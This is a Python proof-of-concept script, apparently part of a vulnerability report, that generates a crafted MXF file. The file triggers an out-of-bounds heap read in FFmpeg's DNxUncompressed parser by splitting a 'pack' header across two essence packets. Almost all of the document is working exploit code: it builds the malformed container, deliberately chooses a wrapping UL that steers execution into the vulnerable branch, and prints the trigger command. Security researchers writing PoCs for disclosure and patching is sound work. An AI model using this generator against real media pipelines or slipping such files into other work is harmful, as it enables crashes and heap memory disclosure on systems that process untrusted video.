#!/usr/bin/env python3
"""
PoC generator for VULN-001: OOB Heap Read in ff_combine_frame via Negative next from dnxuc_parse.

Creates a minimal MXF file containing a DNxUncompressed video stream where
the 'pack' header is split across two essence packets (7 bytes in first,
1 byte in second), triggering the heap OOB read in ff_combine_frame().

Vulnerability location: libavcodec/dnxuc_parser.c, lines 56-63
Root cause: when only the first 7 bytes of an 8-byte 'pack' header have been
  accumulated into pc->state64 (from a prior parser call), the next call with
  buf[0]='k' finds a match at i=0 and computes next = 0-7 = -7.
  ff_combine_frame() is then called with next=-7, causing:
    memcpy(&pc->buffer[pc->index], *buf, -7 + 64) = memcpy(..., buf, 57 bytes)
  from a source buffer of only 1 byte.

Attack vector: ffmpeg -i crafted.mxf -f null -
"""

import struct
import os
import sys

# ---- Binary helpers ----

def ber_encode(n):
    """Encode integer n as a BER-definite length."""
    if n < 128:
        return bytes([n])
    elif n < 256:
        return bytes([0x81, n])
    elif n < 65536:
        return bytes([0x82, (n >> 8) & 0xFF, n & 0xFF])
    else:
        return bytes([0x83, (n >> 16) & 0xFF, (n >> 8) & 0xFF, n & 0xFF])

def klv(key, value):
    """Create a KLV (Key-Length-Value) element."""
    key = bytes(key)
    value = bytes(value)
    return key + ber_encode(len(value)) + value

def ltv(tag, value):
    """Create a local tag-length-value entry for a metadata set."""
    value = bytes(value)
    return struct.pack('>HH', tag, len(value)) + value

def strong_ref_array(uids):
    """Create an MXF strong reference batch array (4-byte count + 4-byte item_size + UIDs)."""
    data = struct.pack('>II', len(uids), 16)
    for uid in uids:
        data += bytes(uid)[:16]
    return data

def u8(n):  return struct.pack('B', n)
def u16be(n): return struct.pack('>H', n)
def u32be(n): return struct.pack('>I', n)
def u64be(n): return struct.pack('>Q', n)

# ---- MXF ULs / Keys ----

# Partition Pack keys (16 bytes each, all lowercase for clarity)
KEY_HEADER_PP  = bytes([0x06,0x0E,0x2B,0x34,0x02,0x05,0x01,0x01,0x0D,0x01,0x02,0x01,0x01,0x02,0x01,0x00])  # Header Open Incomplete
KEY_BODY_PP    = bytes([0x06,0x0E,0x2B,0x34,0x02,0x05,0x01,0x01,0x0D,0x01,0x02,0x01,0x01,0x03,0x01,0x00])  # Body Open Incomplete
KEY_FOOTER_PP  = bytes([0x06,0x0E,0x2B,0x34,0x02,0x05,0x01,0x01,0x0D,0x01,0x02,0x01,0x01,0x04,0x02,0x00])  # Footer Complete
KEY_PRIMER_PP  = bytes([0x06,0x0E,0x2B,0x34,0x02,0x05,0x01,0x01,0x0D,0x01,0x02,0x01,0x01,0x05,0x01,0x00])  # Primer Pack

# Metadata object keys (all use the "02 53 01 01" scheme = local set)
KEY_PREFACE    = bytes([0x06,0x0E,0x2B,0x34,0x02,0x53,0x01,0x01,0x0D,0x01,0x01,0x01,0x01,0x01,0x2F,0x00])
KEY_IDENT      = bytes([0x06,0x0E,0x2B,0x34,0x02,0x53,0x01,0x01,0x0D,0x01,0x01,0x01,0x01,0x01,0x30,0x00])
KEY_CONTENT_ST = bytes([0x06,0x0E,0x2B,0x34,0x02,0x53,0x01,0x01,0x0D,0x01,0x01,0x01,0x01,0x01,0x18,0x00])
KEY_MAT_PKG    = bytes([0x06,0x0E,0x2B,0x34,0x02,0x53,0x01,0x01,0x0D,0x01,0x01,0x01,0x01,0x01,0x36,0x00])
KEY_SRC_PKG    = bytes([0x06,0x0E,0x2B,0x34,0x02,0x53,0x01,0x01,0x0D,0x01,0x01,0x01,0x01,0x01,0x37,0x00])
KEY_TRACK      = bytes([0x06,0x0E,0x2B,0x34,0x02,0x53,0x01,0x01,0x0D,0x01,0x01,0x01,0x01,0x01,0x3B,0x00])
KEY_SEQUENCE   = bytes([0x06,0x0E,0x2B,0x34,0x02,0x53,0x01,0x01,0x0D,0x01,0x01,0x01,0x01,0x01,0x0F,0x00])
KEY_SRC_CLIP   = bytes([0x06,0x0E,0x2B,0x34,0x02,0x53,0x01,0x01,0x0D,0x01,0x01,0x01,0x01,0x01,0x11,0x00])
KEY_DESCRIPTOR = bytes([0x06,0x0E,0x2B,0x34,0x02,0x53,0x01,0x01,0x0D,0x01,0x01,0x01,0x01,0x01,0x28,0x00])  # CDCIEssenceDescriptor

# DNxUC specific ULs (from mxfdec.c / mxf.c)
# Picture Essence Coding UL for DNxUncompressed (used in 0x3201)
# From mxf.c line 64: { 0x06,0x0E,0x2B,0x34,0x04,0x01,0x01,0x0D,0x04,0x01,0x02,0x02,0x03,0x07,0x01,0x00 }
UL_DNXUC_CODEC = bytes([0x06,0x0E,0x2B,0x34,0x04,0x01,0x01,0x0D,0x04,0x01,0x02,0x02,0x03,0x07,0x01,0x00])
# Essence Container UL for DNxUncompressed — byte 14 set to 0x00 (not 0x01=FrameWrapped,
# not 0x02=ClipWrapped) so that mxf_get_wrapping_kind() returns UnknownWrapped.
# The table entry matches on only 14 bytes (indices 0-13), so the change to byte 14 still
# hits the DNxUC entry, reads val=0x00, and falls through to return UnknownWrapped.
# This causes mxfdec.c line 3141 to overwrite need_parsing with AVSTREAM_PARSE_TIMESTAMPS
# instead of AVSTREAM_PARSE_HEADERS, so demux.c never sets PARSER_FLAG_COMPLETE_FRAMES,
# and dnxuc_parser.c takes the vulnerable else branch.
UL_DNXUC_CONTAINER = bytes([0x06,0x0E,0x2B,0x34,0x04,0x01,0x01,0x0D,0x0D,0x01,0x03,0x01,0x02,0x1E,0x00,0x00])
# OP1a Operational Pattern UL (bytes 12-13 = 0x01,0x01 → OP1a)
UL_OP1A = bytes([0x06,0x0E,0x2B,0x34,0x04,0x01,0x01,0x01,0x0D,0x01,0x02,0x01,0x01,0x01,0x09,0x00])
# Picture DataDefinition UL (from mxf.c ff_mxf_data_definition_uls line 32)
UL_PICTURE_DEF = bytes([0x06,0x0E,0x2B,0x34,0x04,0x01,0x01,0x01,0x01,0x03,0x02,0x02,0x01,0x00,0x00,0x00])

# Essence Element Key for body (first 12 bytes = mxf_essence_element_key, then 4 bytes track number)
ESSENCE_ELEM_KEY_PREFIX = bytes([0x06,0x0E,0x2B,0x34,0x01,0x02,0x01,0x01,0x0D,0x01,0x03,0x01])
TRACK_NUMBER = bytes([0x15,0x01,0x01,0x00])  # track number for essence element (must match source track's 0x4804)

ESSENCE_ELEM_KEY = ESSENCE_ELEM_KEY_PREFIX + TRACK_NUMBER  # 16 bytes

# ---- Instance UIDs for all objects ----
UID_PREFACE    = bytes(range(0x01, 0x11))   # 01 02 ... 10
UID_IDENT      = bytes(range(0x11, 0x21))   # 11 12 ... 20
UID_CONTENT_ST = bytes(range(0x21, 0x31))   # 21 22 ... 30
UID_MAT_PKG    = bytes(range(0x31, 0x41))   # 31 32 ... 40
UID_MAT_TRACK  = bytes(range(0x41, 0x51))   # 41 42 ... 50
UID_MAT_SEQ    = bytes(range(0x51, 0x61))   # 51 52 ... 60
UID_MAT_CLIP   = bytes(range(0x61, 0x71))   # 61 62 ... 70
UID_SRC_PKG    = bytes(range(0x71, 0x81))   # 71 72 ... 80
UID_SRC_TRACK  = bytes(range(0x81, 0x91))   # 81 82 ... 90
UID_SRC_SEQ    = bytes(range(0x91, 0xA1))   # 91 92 ... A0
UID_SRC_CLIP   = bytes(range(0xA1, 0xB1))   # A1 A2 ... B0
UID_DESCRIPTOR = bytes(range(0xB1, 0xC1))   # B1 B2 ... C0

# Package UMIDs (32 bytes each = package_ul (16 bytes) + package_uid (16 bytes))
# These are used to link SourceClips to packages
MAT_PKG_UL  = b'\xAA' * 16   # material package_ul
MAT_PKG_UID = b'\xBB' * 16   # material package_uid
SRC_PKG_UL  = b'\xCC' * 16   # source package_ul
SRC_PKG_UID = b'\xDD' * 16   # source package_uid

# Null UMID for the source source clip (points to no package = original source)
NULL_UMID = b'\x00' * 32


# ---- Build metadata objects ----

def build_partition_pack(key, kag_size, this_partition, prev_partition,
                          footer_partition, header_byte_count,
                          index_byte_count, index_sid, body_offset,
                          body_sid, op_ul, essence_container_uls):
    """Build a partition pack value (not including the KLV header)."""
    data  = u16be(1)            # MajorVersion
    data += u16be(2)            # MinorVersion
    data += u32be(kag_size)
    data += u64be(this_partition)
    data += u64be(prev_partition)
    data += u64be(footer_partition)
    data += u64be(header_byte_count)
    data += u64be(index_byte_count)
    data += u32be(index_sid)
    data += u64be(body_offset)
    data += u32be(body_sid)
    data += bytes(op_ul)[:16]   # OperationalPattern UL
    data += u32be(len(essence_container_uls))
    for ec_ul in essence_container_uls:
        data += bytes(ec_ul)[:16]
    return klv(key, data)

def build_primer_pack():
    """Build an empty primer pack (no dynamic local tags needed)."""
    data  = u32be(0)   # item_num = 0
    data += u32be(18)  # item_len = 18 (required even if 0 items)
    return klv(KEY_PRIMER_PP, data)

def build_preface():
    """Build a minimal Preface metadata set."""
    data  = ltv(0x3C0A, UID_PREFACE)  # InstanceUID
    return klv(KEY_PREFACE, data)

def build_identification():
    """Build a minimal Identification metadata set."""
    data  = ltv(0x3C0A, UID_IDENT)   # InstanceUID
    return klv(KEY_IDENT, data)

def build_content_storage():
    """Build ContentStorage with references to both packages."""
    packages = strong_ref_array([UID_MAT_PKG, UID_SRC_PKG])
    data  = ltv(0x3C0A, UID_CONTENT_ST)  # InstanceUID
    data += ltv(0x1901, packages)          # PackageList
    return klv(KEY_CONTENT_ST, data)

def build_material_package():
    """Build MaterialPackage with one video track."""
    tracks = strong_ref_array([UID_MAT_TRACK])
    data  = ltv(0x3C0A, UID_MAT_PKG)          # InstanceUID
    data += ltv(0x4401, MAT_PKG_UL + MAT_PKG_UID)  # PackageUID (UMID)
    data += ltv(0x4403, tracks)                # Tracks
    return klv(KEY_MAT_PKG, data)

def build_material_track():
    """Build material package track."""
    edit_rate = u32be(25) + u32be(1)  # 25/1 fps
    data  = ltv(0x3C0A, UID_MAT_TRACK)  # InstanceUID
    data += ltv(0x4801, u32be(1))        # TrackID = 1
    data += ltv(0x4804, b'\x00'*4)       # TrackNumber = 0 (material side)
    data += ltv(0x4B01, edit_rate)       # EditRate = 25/1
    data += ltv(0x4803, UID_MAT_SEQ)     # Sequence
    return klv(KEY_TRACK, data)

def build_material_sequence():
    """Build material track sequence with one source clip."""
    components = strong_ref_array([UID_MAT_CLIP])
    data  = ltv(0x3C0A, UID_MAT_SEQ)     # InstanceUID
    data += ltv(0x0201, UL_PICTURE_DEF)   # DataDefinition = Picture
    data += ltv(0x0202, u64be(2))          # Duration = 2 frames
    data += ltv(0x1001, components)        # StructuralComponents
    return klv(KEY_SEQUENCE, data)

def build_material_source_clip():
    """Build material source clip pointing to source package."""
    # Source package UMID (32 bytes) + source track ID
    source_pkg_umid = SRC_PKG_UL + SRC_PKG_UID
    data  = ltv(0x3C0A, UID_MAT_CLIP)      # InstanceUID
    data += ltv(0x0201, UL_PICTURE_DEF)     # DataDefinition = Picture
    data += ltv(0x0202, u64be(2))            # Duration = 2 frames
    data += ltv(0x1101, source_pkg_umid)     # SourcePackageID (UMID)
    data += ltv(0x1102, u32be(1))            # SourceTrackID = 1
    return klv(KEY_SRC_CLIP, data)

def build_source_package():
    """Build SourcePackage with one video track and descriptor."""
    tracks = strong_ref_array([UID_SRC_TRACK])
    data  = ltv(0x3C0A, UID_SRC_PKG)          # InstanceUID
    data += ltv(0x4401, SRC_PKG_UL + SRC_PKG_UID)  # PackageUID (UMID)
    data += ltv(0x4403, tracks)                # Tracks
    data += ltv(0x4701, UID_DESCRIPTOR)        # Descriptor ref
    return klv(KEY_SRC_PKG, data)

def build_source_track():
    """Build source package track."""
    edit_rate = u32be(25) + u32be(1)
    data  = ltv(0x3C0A, UID_SRC_TRACK)  # InstanceUID
    data += ltv(0x4801, u32be(1))         # TrackID = 1
    data += ltv(0x4804, TRACK_NUMBER)     # TrackNumber (matches essence element key bytes 12-15)
    data += ltv(0x4B01, edit_rate)        # EditRate = 25/1
    data += ltv(0x4803, UID_SRC_SEQ)      # Sequence
    return klv(KEY_TRACK, data)

def build_source_sequence():
    """Build source track sequence."""
    components = strong_ref_array([UID_SRC_CLIP])
    data  = ltv(0x3C0A, UID_SRC_SEQ)    # InstanceUID
    data += ltv(0x0201, UL_PICTURE_DEF)  # DataDefinition = Picture
    data += ltv(0x0202, u64be(2))         # Duration = 2 frames
    data += ltv(0x1001, components)       # StructuralComponents
    return klv(KEY_SEQUENCE, data)

def build_source_source_clip():
    """Build source source clip (points to null = original source)."""
    data  = ltv(0x3C0A, UID_SRC_CLIP)   # InstanceUID
    data += ltv(0x0201, UL_PICTURE_DEF)  # DataDefinition = Picture
    data += ltv(0x0202, u64be(2))         # Duration = 2 frames
    data += ltv(0x1101, NULL_UMID)        # SourcePackageID = null (original)
    data += ltv(0x1102, u32be(0))         # SourceTrackID = 0
    return klv(KEY_SRC_CLIP, data)

def build_descriptor():
    """Build CDCIEssenceDescriptor for DNxUncompressed."""
    data  = ltv(0x3C0A, UID_DESCRIPTOR)       # InstanceUID
    data += ltv(0x3004, UL_DNXUC_CONTAINER)   # EssenceContainer UL (maps to AV_CODEC_ID_DNXUC)
    data += ltv(0x3201, UL_DNXUC_CODEC)       # PictureEssenceCoding UL (maps to AV_CODEC_ID_DNXUC)
    data += ltv(0x3203, u32be(1))              # StoredWidth = 1
    data += ltv(0x3202, u32be(1))              # StoredHeight = 1
    data += ltv(0x3006, u32be(1))              # LinkedTrackID = 1
    return klv(KEY_DESCRIPTOR, data)


def build_essence_element(data):
    """Build one essence element KLV."""
    return klv(ESSENCE_ELEM_KEY, data)


# ---- Assemble the MXF file ----

def build_mxf():
    """Build a minimal MXF file that triggers the dnxuc_parser OOB read."""

    # Build all header metadata objects
    primer_pack  = build_primer_pack()
    preface      = build_preface()
    ident        = build_identification()
    content_st   = build_content_storage()
    mat_pkg      = build_material_package()
    mat_track    = build_material_track()
    mat_seq      = build_material_sequence()
    mat_clip     = build_material_source_clip()
    src_pkg      = build_source_package()
    src_track    = build_source_track()
    src_seq      = build_source_sequence()
    src_clip     = build_source_source_clip()
    descriptor   = build_descriptor()

    # Concatenate all header metadata (after the primer pack, after HPP)
    header_metadata = (
        primer_pack + preface + ident + content_st +
        mat_pkg + mat_track + mat_seq + mat_clip +
        src_pkg + src_track + src_seq + src_clip +
        descriptor
    )

    # Build essence elements:
    # First 7 bytes: \x08\x00\x00\x00\x70\x61\x63 (LE size=8, then 'p','a','c')
    # Second 1 byte: \x6B ('k')
    # When the parser accumulates these across two calls:
    #   Call 1 (7 bytes): state64 = 0x0000000870616300 | 0x63 = ... ends with 'c'
    #   Call 2 (1 byte):  state = (prev_state << 8) | 0x6B = ...7061636B
    #                     (uint32_t)state = 0x7061636B = MKBETAG('p','a','c','k') MATCH!
    #                     next = 0 - 7 = -7 → OOB read in ff_combine_frame
    essence1 = build_essence_element(b'\x08\x00\x00\x00\x70\x61\x63')  # 7 bytes
    essence2 = build_essence_element(b'\x6B')                            # 1 byte

    # Compute offsets:
    # Header Partition Pack is at offset 0
    # We don't know its size yet (depends on HeaderByteCount)
    # Compute size of HPP with placeholder values first, then fixup

    HPP_VALUE_SIZE = (2+2+4+8+8+8+8+8+4+8+4+16+4+16)  # = 100 bytes
    HPP_KLV_SIZE = 16 + 1 + HPP_VALUE_SIZE  # 16 key + 1 BER + 100 value = 117 bytes

    # Offset of body partition pack = after HPP + header metadata
    body_pp_offset = HPP_KLV_SIZE + len(header_metadata)
    footer_pp_offset = body_pp_offset + (16 + 1 + HPP_VALUE_SIZE) + len(essence1) + len(essence2)

    # Build Header Partition Pack
    hpp = build_partition_pack(
        key=KEY_HEADER_PP,
        kag_size=1,
        this_partition=0,
        prev_partition=0,
        footer_partition=footer_pp_offset,
        header_byte_count=len(header_metadata),
        index_byte_count=0,
        index_sid=0,
        body_offset=0,
        body_sid=0,
        op_ul=UL_OP1A,
        essence_container_uls=[UL_DNXUC_CONTAINER]
    )

    assert len(hpp) == HPP_KLV_SIZE, f"HPP size mismatch: {len(hpp)} != {HPP_KLV_SIZE}"

    # Build Body Partition Pack
    bpp = build_partition_pack(
        key=KEY_BODY_PP,
        kag_size=1,
        this_partition=body_pp_offset,
        prev_partition=0,
        footer_partition=footer_pp_offset,
        header_byte_count=0,
        index_byte_count=0,
        index_sid=0,
        body_offset=0,
        body_sid=1,
        op_ul=UL_OP1A,
        essence_container_uls=[UL_DNXUC_CONTAINER]
    )

    # Build Footer Partition Pack
    fpp = build_partition_pack(
        key=KEY_FOOTER_PP,
        kag_size=1,
        this_partition=footer_pp_offset,
        prev_partition=body_pp_offset,
        footer_partition=footer_pp_offset,
        header_byte_count=0,
        index_byte_count=0,
        index_sid=0,
        body_offset=0,
        body_sid=0,
        op_ul=UL_OP1A,
        essence_container_uls=[]
    )

    # Assemble the complete file
    mxf_data = hpp + header_metadata + bpp + essence1 + essence2 + fpp

    return mxf_data


def main():
    outdir = os.path.dirname(os.path.abspath(__file__))
    outfile = os.path.join(outdir, 'crafted.mxf')

    data = build_mxf()

    with open(outfile, 'wb') as f:
        f.write(data)

    print(f"[+] Written {len(data)} bytes to {outfile}")
    print(f"[+] Trigger: ffmpeg -i {outfile} -f null -")
    print()
    print("[+] Vulnerability: dnxuc_parser.c OOB heap read")
    print("[+] The MXF file has two DNxUC essence elements:")
    print(f"    Essence 1 (7 bytes): {b'\\x08\\x00\\x00\\x00\\x70\\x61\\x63'.hex()}")
    print(f"    Essence 2 (1 byte):  {b'\\x6B'.hex()}")
    print()
    print("[+] Parser call 1 (7 bytes): no 'pack' match found → accumulates into pc->buffer")
    print("    pc->index = 7 after this call")
    print("[+] Parser call 2 (1 byte = 'k'): at i=0, state matches MKBETAG('p','a','c','k')")
    print("    next = i - 7 = -7")
    print("    ff_combine_frame called with next=-7:")
    print("    memcpy(&pc->buffer[7], buf, -7 + AV_INPUT_BUFFER_PADDING_SIZE)")
    print("    = memcpy(&pc->buffer[7], buf, 57) <- buf has only 1 byte!")
    print("    --> HEAP OOB READ of 56 bytes beyond the 1-byte buffer")


if __name__ == '__main__':
    main()
